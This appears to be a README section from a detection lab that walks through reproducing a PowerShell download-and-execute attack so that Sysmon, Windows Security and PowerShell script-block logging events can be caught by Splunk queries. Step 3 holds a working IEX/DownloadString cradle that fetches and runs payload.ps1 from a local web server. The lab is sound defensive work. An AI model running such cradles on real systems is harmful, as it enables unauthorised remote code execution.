## How to reproduce

1. Prerequisites:
   - Splunk Enterprise installed on ubuntu-soc, listening for UF on port 9997.
   - Splunk Universal Forwarder installed and configured on the Windows host (`inputs.conf`, `outputs.conf` in `*/SplunkUniversalForwarder/etc/system/local/`).
   - Sysmon installed on Windows with ProcessCreate (EventID=1) logging enabled.
   - Enable Module Logging and Script Block Logging (Local Group Policy or GPO).
   - Confirm Microsoft-Windows-PowerShell/Operational channel is active.

2. From the machine that will host `payload.ps1` (on the host that is reachable via 127.0.0.1:8001 from the Windows VM)
```
# run from folder with file
python3 -m http.server 8001
```
Confirm with curl on indexer / host:
```
curl http://127.0.0.1:8001/payload.ps1
```
3. Open PowerShell on the Windows VM and run:
```
powershell -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8001/payload.ps1')"
```
4. Expected events:
  - Sysmon - EventID=1 (Process Create) for powershell.exe
  - Windows Security - EventID=4688 (New Process Created) for powershell.exe
  - PowerShell Operational - EventID=4104 (ScriptBlockExecuted / ScriptBlockText contains payload or IEX/DownloadString)
These three events should correlate by _time, host, and ProcessId/CommandLine.

5. In Splunk Search run `queries/powershell_process_creation.spl`, `suspicious_scriptblock.spl`, `sysmon_process_create.spl`.
